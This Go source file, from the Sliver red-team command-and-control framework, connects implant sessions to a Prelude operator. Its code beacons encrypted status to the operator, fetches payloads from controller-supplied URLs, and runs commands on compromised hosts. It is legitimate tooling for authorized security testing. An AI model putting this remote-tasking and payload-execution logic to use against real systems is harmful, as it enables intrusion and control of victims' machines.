package prelude

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/bishopfox/sliver/client/prelude/util"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

const (
	defaultTimeout = 60
	delim          = "\r\n"
)

type AgentSession struct {
	Conn    *net.Conn
	Session *clientpb.Session
	RPC     rpcpb.SliverRPCClient
	Beacon  Beacon
	Config  AgentConfig
}

func NewAgentSession(c *net.Conn, s *clientpb.Session, rpc rpcpb.SliverRPCClient, b Beacon, conf AgentConfig) *AgentSession {
	return &AgentSession{
		Conn:    c,
		Session: s,
		RPC:     rpc,
		Config:  conf,
		Beacon:  b,
	}
}

func (a *AgentSession) ReceiveLoop() {
	for {
		err := a.send()
		if err != nil {
			return
		}
		scanner := bufio.NewScanner(*a.Conn)
		for scanner.Scan() {
			message := strings.TrimSpace(scanner.Text())
			err = a.respond(message)
			if err != nil {
				return
			}
		}
	}
}

func (a *AgentSession) send() error {
	data, err := json.Marshal(a.Beacon)
	if err != nil {
		return err
	}
	dataBuff := bytes.NewReader(append(util.Encrypt(data), "\n"...))
	sendBuffer := make([]byte, 1024)
	for {
		_, err := dataBuff.Read(sendBuffer)
		if err == io.EOF {
			return nil
		}
		if err != nil {
			return err
		}
		if _, err = (*a.Conn).Write(sendBuffer); err != nil {
			return err
		}
		time.Sleep(time.Duration(a.Beacon.Sleep))
	}
}

func (a *AgentSession) respond(message string) error {
	var tempBeacon Beacon
	if err := json.Unmarshal([]byte(util.Decrypt(message)), &tempBeacon); err == nil {
		a.Beacon.Links = a.Beacon.Links[:0]
		a.runLinks(&tempBeacon)
	}
	a.refreshBeacon(&a.Config)
	a.send()
	return nil
}

func (a *AgentSession) runLinks(tempBeacon *Beacon) {
	for _, link := range a.Config.StartInstructions(tempBeacon.Links) {
		time.Sleep(time.Second * 1)
		var payload []byte
		if link.Payload != "" {
			payload, _ = requestPayload(link.Payload)
		}
		response, status, pid := RunCommand(link.Request, link.Executor, payload, a)
		link.Response = response
		link.Status = status
		link.Pid = pid
		a.Beacon.Links = append(a.Beacon.Links, link)
		a.Config.EndInstruction(link)
	}
}

func requestPayload(target string) ([]byte, error) {
	resp, err := http.Get(target)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("invalid status code: %d", resp.StatusCode)
	}
	return ioutil.ReadAll(resp.Body)
}

func (a *AgentSession) refreshBeacon(conf *AgentConfig) {
	var pwd string
	pwdResp, _ := a.RPC.Pwd(context.Background(), &sliverpb.PwdReq{
		Request: MakeRequest(a.Session),
	})
	if pwdResp != nil {
		pwd = pwdResp.Path
	}
	a.Beacon.Sleep = conf.Sleep
	a.Beacon.Range = conf.Range
	a.Beacon.Pwd = pwd
	a.Beacon.Target = conf.Address
	a.Beacon.Executing = conf.BuildExecutingHash()

}

func MakeRequest(session *clientpb.Session) *commonpb.Request {
	if session == nil {
		return nil
	}
	timeout := int64(defaultTimeout)
	return &commonpb.Request{
		SessionID: session.ID,
		Timeout:   timeout,
	}
}
